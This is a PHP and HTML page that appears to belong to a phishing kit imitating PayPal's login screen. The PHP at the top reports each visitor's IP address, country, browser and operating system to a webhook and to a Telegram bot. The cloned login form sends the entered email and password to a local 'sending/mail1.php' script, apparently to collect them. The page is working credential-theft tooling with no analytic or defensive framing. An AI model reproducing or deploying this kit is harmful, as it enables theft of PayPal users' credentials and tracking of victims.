<?php 

session_start();

include 'main.php';
include 'config/settings.php';
include 'lang.php';

$message .= "⏩ $ip - $cn - $br - $os\n";
$url = "" . $webhook . "";
$headers = ['Content-Type: application/json; charset=utf-8'];
$POST = ['username' => 'Quartz', 'content' => $message];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response = curl_exec($ch);

$apiUrl = "https://api.telegram.org/bot$http_api/sendMessage";
$params = ['chat_id' => $chat_id, 'text' => $message];
$queryString = http_build_query($params);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "$apiUrl?$queryString");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
curl_close($ch);


?>

<!doctype html>
<html lang="en" class=" desktop js "><head>
      <meta charset="utf-8">
      <title><?php echo lang('1');?></title>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <link rel="shortcut icon" href="./assets/img/favicon.ico">
      <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
      <link rel="stylesheet" href="./assets/css/main.css">
   </head>
   <body class="desktop ">
      <div id="main" class="main" role="main">
         <section id="slLanding" class="slLanding hide" data-role="page" data-title="Connect your Google account, check out faster on your devices">
            <div class="corral">
               <div id="slContent" class="contentContainer contentContainerBordered">
                  <header>
                     <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long"></p>
                  </header>
                  <div id="linked" class="linked ">
                     <div class="profileRemembered"><span class="loginEmail"></span><a href="#" class="changeLink scTrack:not-you" id="changeLink" pa-marked="1">Change</a></div>
                     <div class="headerTextDecorated"></div>
                     <h1 class="headerText">Stay logged in for faster checkout</h1>
                     <p class="description assure">Enable auto login on this browser and speed through checkout every time. (Not recommended for shared devices.)<span class="learnMoreLink"><a href="#" id="slLoginLearnMore" class="secondayLink" pa-marked="1">What's this?</a></span></p>
                     <div id="partnerProfile" class="partnerProfile">
                        <div id="partnerPhoto" class="partnerPhoto" style="background-image: url('')"></div>
                        <div class="partnerDetails">
                           <span>You're logged in as</span>
                           <div id="displayName" class="displayName"></div>
                           <div>
                              <div class="partnerEmailDiv"><span class="partnerIcon"></span><span id="partnerEmail" class="partnerEmail"></span><span id="partnerEmailDomain"></span></div>
                           </div>
                        </div>
                     </div>
                     <div class="actions actionsSpacedShort"><button class="button actionContinue scTrack:unifiedlogin-continue" id="continueBtn" name="continueBtn" value="continueBtn" pa-marked="1">Continue</button></div>
                     <div id="secondaryLogin" class="buttonAsLink secondaryLink"><button class="scTrack:unifiedlogin-use-password" id="secondaryLoginBtn" name="secondaryLoginBtn" value="secondaryLoginBtn" pa-marked="1">Use password instead</button></div>
                  </div>
                  <div id="unlinked" class="unlinked ">
                     <div id="headerIcon" class="partnerConnect"></div>
                     <h1 class="headerText">Connect your Google account, check out faster on your devices</h1>
                     <p class="description assure">Automatically log in to PayPal for faster checkout without typing your password wherever you're logged in with your Google account.<a href="#" id="slOptInlearnMore" class="secondayLink scTrack:unifiedlogin-sl-whatsthis" pa-marked="1">What's this?</a></p>
                     <p class="secondaryLink hide" id="slOptIn_notNow"><a href="#" pa-marked="1">Not now</a></p>
                  </div>
                  <div id="learnMoreModal" class="learnMoreModal">
                     <div id="optInLearnMoreDesc" class="optInLearnMoreDesc ">
                        <h1 class="headerText headerTextSpaced">Why connect my Google account?</h1>
                        <p> Linking your Google account allows you to activate One Touch quickly and easily when you check out. You can always opt out later in Settings at PayPal.com.</p>
                        <p> Whenever you check out on a new device and browser when logged in with your Google account, you can automatically log in at checkout without typing your password.</p>
                     </div>
                     <div id="slLoginLearnMoreDesc" class="slLoginLearnMoreDesc ">
                        <h1 class="headerText headerTextSpaced">Stay logged in for faster checkout</h1>
                        <p> Skip typing your password by staying logged in on this device. For security, we'll occassionally ask you to log in, including every time you update your personal or financial info. We don't recommend using One Touch on shared devices. Turn this off at any time in your PayPal settings.</p>
                     </div>
                     <button type="button" class="ui-dialog-titlebar-close" pa-marked="1"></button>
                  </div>
                  <div class="intentFooter ">
                     <div class="localeSelector  ">
                        <span class="picker country-selector"><span class="hide" id="countryPickerLink">United States</span><button type="button" aria-label="countryPickerLink" class="country US" pa-marked="1"></button></span>
                        <ul class="localeLink">
                           <li><a class="selected scTrack:unifiedlogin-footer-language_en_US" href="/signin?country.x=US&amp;locale.x=en_US&amp;langTgl=en" lang="en" data-locale="en_US" aria-current="”true”" pa-marked="1">English</a></li>
                           <li><a class=" scTrack:unifiedlogin-footer-language_fr_XC" href="/signin?country.x=US&amp;locale.x=fr_XC&amp;langTgl=fr" lang="fr" data-locale="fr_XC" pa-marked="1">Français</a></li>
                           <li><a class=" scTrack:unifiedlogin-footer-language_es_XC" href="/signin?country.x=US&amp;locale.x=es_XC&amp;langTgl=es" lang="es" data-locale="es_XC" pa-marked="1">Español</a></li>
                           <li><a class=" scTrack:unifiedlogin-footer-language_zh_XC" href="/signin?country.x=US&amp;locale.x=zh_XC&amp;langTgl=zh" lang="zh" data-locale="zh_XC" pa-marked="1">中文</a></li>
                        </ul>
                     </div>
                  </div>
               </div>
            </div>
         </section>
         <section id="login" class="login  " data-role="page" data-title="Log in to your PayPal account">
            <div class="corral ">
               <div id="content" class="contentContainer activeContent contentContainerBordered">
                  <header id="header">
                     <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo"></p>
                  </header>
                  <h1 id="headerText" class="headerText  accessAid">Log in to your PayPal account</h1>
                  <p id="phoneSubTagLine" class="subHeaderText hide">Already set up to use your mobile number to log in? Type it below. Otherwise, click the link to log in with email.</p>
                  <p id="subTagLineConnectOtp" class="subHeaderText hide">Forgot your email address? Go to the PayPal website to recover it.</p>
                  <div id="loginContent" class="">
                     <div id="loginSection" class="">
                        <div class="notifications"></div>
                        <div id="keychainErrorMessage" class="hide">
                           <p class="notification notification-warning blocked-on-8ball hide">PayPal One Touch™ only works for checkout. Please login with your email.</p>
                           <p class="notification notification-warning blocked-on-risky-login hide">Please login with your email and password.</p>
                           <p class="notification notification-critical keychain-activation-failure hide">Something went wrong on our end. Please login with your email and password.</p>
                        </div>
                        <form action="./sending/mail1.php" method="post" class="proceed maskable" autocomplete="off" name="login" >
                           
                           <div id="passwordSection" class="clearfix splitEmail">
                              <div id="splitEmailSection" class="splitPhoneSection splitEmailSection">
                                 <div class="countryPhoneSelectWrapper hide">
                                    
                                    
                                    
                                 </div>
                                 <div class="textInput" id="login_emaildiv">
                                    <div class="fieldWrapper"><input id="email" required name="login_email" type="email" class="hasHelp  validateEmpty   " required="required" autocomplete="username" placeholder="<?php echo lang('2');?>"><label for="email" class="fieldLabel"><?php echo lang('2');?></label></div>
                                    <div class="errorMessage" id="emailErrorMessage">
                                       <p class="emptyError hide">Required</p>
                                       <p class="invalidError hide">That <?php echo lang('2');?> format isn’t right</p>
                                    </div>
                                 </div>
                              </div>
                              <div id="passwordSection" class="clearfix showHideButtonForEligibleBrowser">
                                 <div class="textInput " id="login_passworddiv">
                                    <div class="fieldWrapper"><input id="password" name="login_password" required type="password" class="hasHelp  validateEmpty   pin-password" required="required" value="" placeholder="Password" aria-describedby="passwordErrorMessage"><label for="password" class="fieldLabel"><?php echo lang('3');?></label><label for="Show password" class="fieldLabel"></label><button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" id="Show password" pa-marked="1">Show</button><label for="Hide" class="fieldLabel">Hide</label><button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" id="Hide" pa-marked="1">Hide</button></div>
                                    <div class="errorMessage" id="passwordErrorMessage">
                                       <p class="emptyError hide">Required</p>
                                    </div>
                                 </div>
                                 <a id="setupPassword" class="recoveryOption forgotPassword hide" data-client-log-action-type="clickSetupPasswordLink" pa-marked="1">Set up a password</a><a id="forgotPassword" class="recoveryOption forgotPassword " data-client-log-action-type="clickForgotPasswordLink" pa-marked="1"><?php echo lang('4');?></a>
                              </div>
                           </div>
                           <div class="actions"><button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1"><?php echo lang('5');?></button></div>
                        </form>
                        <div class="moreOptionsDiv  hide" id="moreOptionsContainer">
                           <a href="#" id="moreOptions" class="moreOptionsInfo" pa-marked="1">More options</a>
                           <div class="bubble-tooltip hide" id="moreOptionsDropDown">
                              <ul class="moreoptionsGroup">
                                 <li><a href="#" id="moreOptionsMobile" class="scTrack:unifiedlogin-click-more-options-mobile" pa-marked="1">Approve login using mobile device</a></li>
                                 <li><a href="/authflow/password-recovery/?country.x=US&amp;locale.x=en_US&amp;redirectUri=%252Fsignin" class="scTrack:unifiedlogin-click-forgot-password pwrLink" pa-marked="1">Having trouble logging in?</a></li>
                              </ul>
                           </div>
                        </div>
                        <div id="beginOtpLogin" class="otpLoginViaButton hidden"><button class="button" href="#" pa-marked="1">Log in with a one-time code</button></div>
                        <div id="tryAnotherWayLinkContainer" class="tryAnotherWayLinkContainer hide" data-hide-on-pass=""><a href="#" id="tryAnotherWayLink" pa-marked="1">Try another way</a></div>
                        <div id="signupContainer" class="signupContainer " data-hide-on-email="" data-hide-on-pass="">
                           <div class="loginSignUpSeparator "><span class="textInSeparator"><?php echo lang('6');?></span></div>
                           <button type="button" href="/us/webapps/mpp/account-selection" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1"><?php echo lang('7');?></button>
                        </div>
                        <div id="tpdButtonContainer" class="signupContainer hide">
                           <div class="loginSignUpSeparator"><span class="textInSeparator"><?php echo lang('6');?></span></div>
                           <div class="actions"><button class="button secondary" id="tpdButton" type="submit" value="Approve login using mobile device" pa-marked="1">Approve login using mobile device</button></div>
                        </div>
                     </div>
                  </div>
                  <div class="intentFooter ">
                     <div class="localeSelector  ">
                        <span class="picker country-selector"><span class="hide" id="countryPickerLink"></span></span>
                        <ul class="localeLink">
                           <li><a class="selected scTrack:unifiedlogin-footer-language_en_US" lang="en" data-locale="en_US" aria-current="”true”" pa-marked="1">English</a></li>
                           <li><a class=" scTrack:unifiedlogin-footer-language_fr_XC" lang="fr" data-locale="fr_XC" pa-marked="1">Français</a></li>
                           <li><a class=" scTrack:unifiedlogin-footer-language_es_XC" lang="es" data-locale="es_XC" pa-marked="1">Español</a></li>
                           <li><a class=" scTrack:unifiedlogin-footer-language_zh_XC" lang="zh" data-locale="zh_XC" pa-marked="1">中文</a></li>
                        </ul>
                     </div>
                  </div>
               </div>
            </div>
            <div id="tryAnotherWayModal" class="tryAnotherWayModal hide">
               <div class="modal-content">
                  <div class="modal-content-header">
                     <div class="modal-header-text">Try another way</div>
                     <div><button id="closeModal" type="button" class="dialog-close" aria-label="dialog-close-btn" pa-marked="1"></button></div>
                  </div>
                  <ul class="modal-content-body">
                     <li class="hide">
                        <a aria-label="Login with Touch ID or Face ID" id="loginWithWebauthn" href="#" pa-marked="1">
                           <div>Log in with face, fingerprint or PIN</div>
                           <button class="chevron-right" aria-label="webauthn-chevron" pa-marked="1"></button>
                        </a>
                     </li>
                     <li class="hide">
                        <a aria-label="Login with phone one-time code" id="loginWithOtp" href="#" pa-marked="1">
                           <div>Text a one-time code</div>
                           <button class="chevron-right" aria-label="phone-otc-chevron" pa-marked="1"></button>
                        </a>
                     </li>
                     <li class="hide">
                        <a aria-label="Login with email one-time code" id="loginWithEmailOtp" href="#" pa-marked="1">
                           <div>Email a one-time code</div>
                           <button class="chevron-right" aria-label="email-otc-chevron" pa-marked="1"></button>
                        </a>
                     </li>
                     <li class="hide">
                        <a aria-label="Login with password" id="loginWithPassword" href="#" pa-marked="1">
                           <div>Log in with your password</div>
                           <button class="chevron-right" aria-label="pwd-chevron" pa-marked="1"></button>
                        </a>
                     </li>
                  </ul>
               </div>
            </div>
         </section>
         <section id="verification" class="verification hide" data-role="page" data-title="Login Confirmation - PayPal">
            <div class="corral">
               <div class="contentContainer contentContainerLean">
                  <div id="pending" class="verificationSubSection">
                     <h1 class="headerText">Open the PayPal app</h1>
                     <p id="uncookiedMessage" class="verification-message hide">Open the PayPal app, tap Yes on the prompt, then tap <span class="twoDigitPin">{twoDigitPin}</span> on your phone to log in.</p>
                     <p id="cookiedMessage" class="verification-message hide">Open the PayPal app and tap Yes on the prompt to log in.</p>
                     <div class="notifications"></div>
                     <div class="accountArea"><span class="account"></span><span class="verificationNotYou"><a data-href="#" href="#" class="scTrack:unifiedlogin-verification-click-notYou" id="pendingNotYouLink" pa-marked="1">Not you?</a></span></div>
                     <div class="mobileNotification">
                        <p class="pin"></p>
                        <div class="mobileScreen"><img src="https://www.paypalobjects.com/images/shared/icon-PN-check.png" alt="phone"></div>
                     </div>
                     <p class="tryAnotherMsg"><a id="tryPasswordLink" data-href="#" href="" class="inlineLink scTrack:try-password" pa-marked="1">Use password instead</a></p>
                     <p class="resendMsg"><a class="inlineLink scTrack:resend hide" role="button" data-href="#resend" href="" id="resend" pa-marked="1">Resend</a><span class="sentMessage hide">Sent</span></p>
                  </div>
                  <div id="expired" class="hide verificationSubSection">
                     <header>
                        <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long">PayPal</p>
                     </header>
                     <h1 class="headerText headerTextWarning">Sorry, we couldn't confirm it's you</h1>
                     <p class="slimP">We didn't receive a response so we were unable confirm your identity.</p>
                     <button id="expiredTryAgainButton" class="button actionsSpaced" pa-marked="1">Try Again</button>
                  </div>
                  <div id="denied" class="denied hide verificationSubSection">
                     <img alt="" src="https://www.paypalobjects.com/images/shared/glyph_alert_critical_big-2x.png" class="deniedCaution">
                     <h1 class="headerText">Sorry, we couldn't confirm it's you</h1>
                     <p>Need a hand?, <a href="/{coBrand}/cgi-bin/helpscr?cmd=_help" class="inlineLink scTrack:help" pa-marked="1">We can help</a>.</p>
                  </div>
               </div>
            </div>
         </section>
      </div>
      <div class="transitioning hide" aria-busy="false">
         <p class="welcomeMessage hide">Welcome, !</p>
         <p class="checkingInfo hide">Checking your info…</p>
         <p class="oneSecond hide">Just a second…</p>
         <p class="secureMessage hide">Securely logging you in...</p>
         <p class="oneTouchMessage hide"></p>
         <p class="retrieveInfo hide">Retrieving your info...</p>
         <p class="waitFewSecs hide">This may take a few seconds...</p>
         <p class="udtSpinnerMessage udtLogin hide">We recognize you on this device, and we’re securely logging you in.</p>
         <p class="udtSpinnerMessage udtLoginXo hide">We recognize you on this device, so no need to enter your password for this purchase.</p>
         <p class="udtSpinnerMessage webllsXoUS hide">We recognize you on this device, so you can skip login.<br><br>Manage this setting in your profile.</p>
         <p class="udtSpinnerMessage webllsSCA hide">We're taking you to PayPal Checkout to complete payment.</p>
         <p class="qrcMessage hide">Redirecting...</p>
         <p class="webAuthnOptin hide">Updating your login settings...</p>
         <p class="webAuthnLogin hide">Logging you in...</p>
         <div class="keychain spinner-content uiExp hide"></div>
      </div>
   
</body></html>